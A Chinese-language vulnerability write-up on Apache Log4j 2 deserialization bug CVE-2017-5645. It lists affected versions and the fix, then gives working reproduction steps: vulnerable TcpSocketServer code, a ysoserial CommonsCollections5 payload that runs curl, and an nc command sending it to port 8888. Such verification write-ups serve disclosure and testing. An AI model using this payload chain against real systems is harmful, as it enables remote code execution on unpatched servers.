## Apache Log4j反序列化漏洞(CVE-2017-5645)  
### 1. 背景  
2017年4月18日，Apache Log4j 被曝出存在一个反序列化漏洞(CVE-2017-5645)，攻击者可以通过发送一个特别制作的2进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload代码。   

### 2. 漏洞危害  
该漏洞主要是由于在处理ObjectInputStream时，接收器对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。目前Log4j官方已经发布新版本修复了该漏洞。     

### 3. 影响版本  

所有Apache Log4j 2.*系列版本： Apache Log4j 2.0-alpha1 – Apache Log4j 2.8.1

不受影响的版本：Apache Log4j 2.8.2    

补丁参考下载地址：http://download.nextag.com/apache/logging/log4j/2.8.2/  

### 4. 漏洞验证  

#### 1. 搭建存在代码漏洞的环境  

1. 直接通过命令行，开启tcpsockerserver  

		java -cp "log4j-api-2.8.1.jar:log4j-core-2.8.1.jar" org.apache.logging.log4j.core.net.server.TcpSocketServer

2. 通过Java代码开启tcpsocketserver

	1. 创建Java工程，添加lib目录，复制log4j-api-2.8.2.jar、log4j-core-2.8.1.jar以及触发反序列化的commons-collections-3.1.jar      
	2. 在build path中将jar包添加至环境变量    
	3. 写开启TcpSocketServer的代码  

			package com.snowsec0.log4j;

			/**
 				* Apache Log4j反序列化漏洞(CVE-2017-5645)
 			*/


			import java.io.IOException;
			import java.io.ObjectInputStream;

			import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge;
			import org.apache.logging.log4j.core.net.server.TcpSocketServer;

			public class Log4jTcpSocketServer {
 
			public static void main(String[] args) {
     			TcpSocketServer<ObjectInputStream> myServer = null;
        			try {
           			 myServer = new TcpSocketServer<ObjectInputStream>(8888,new ObjectInputStreamLogEventBridge());
        			} catch (IOException e) {
            e.printStackTrace();
       			 }
        			myServer.run();
       			 System.out.println("run end.");
    			}
			}

	
3. 生成二进制攻击POC  
	
		java -jar ysoserial-master.jar CommonsCollections5 "curl http://127.0.0.1/ssrf/ssrf.php?rand=log4j" > log4j.curl.bin

4. 通过nc发送poc   

		nc 127.0.0.1 8888 < log4j.curl.bin
		
5. 最终触发漏洞执行  


